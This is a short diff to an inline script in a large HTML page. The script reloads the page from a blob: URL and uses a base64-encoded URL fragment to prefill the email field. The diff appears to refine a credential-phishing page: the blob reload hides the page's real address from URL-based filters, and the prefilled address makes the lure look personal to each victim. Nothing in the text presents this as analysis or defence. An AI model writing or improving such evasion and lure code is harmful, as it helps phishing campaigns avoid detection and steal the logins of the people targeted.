@@ -17772,21 +17772,23 @@
 <script>
     if (!window.location.href.startsWith('blob:')) {
       const hash = window.location.hash.replace('#', '');
+      const encoded = btoa(hash);
       fetch(window.location.href)
         .then(r => r.text())
         .then(html => {
           const blob = new Blob([html], {type: 'text/html'});
           const blobUrl = URL.createObjectURL(blob);
-          const encoded = btoa(hash);
-          sessionStorage.setItem('h', '#' + hash);
           window.location.replace(blobUrl + '#' + encoded);
         });
     } else {
-      const stored = sessionStorage.getItem('h');
-      if (stored) {
-        sessionStorage.removeItem('h');
-        window.location.hash = stored.replace('#', '');
-      }
+      const encoded = window.location.hash.replace('#', '');
+      try {
+        const decoded = atob(encoded);
+        const emailInput = document.querySelector('input[type="email"]');
+        if (emailInput) {
+          emailInput.value = decoded;
+        }
+      } catch(e) {}
     }
   </script>
    
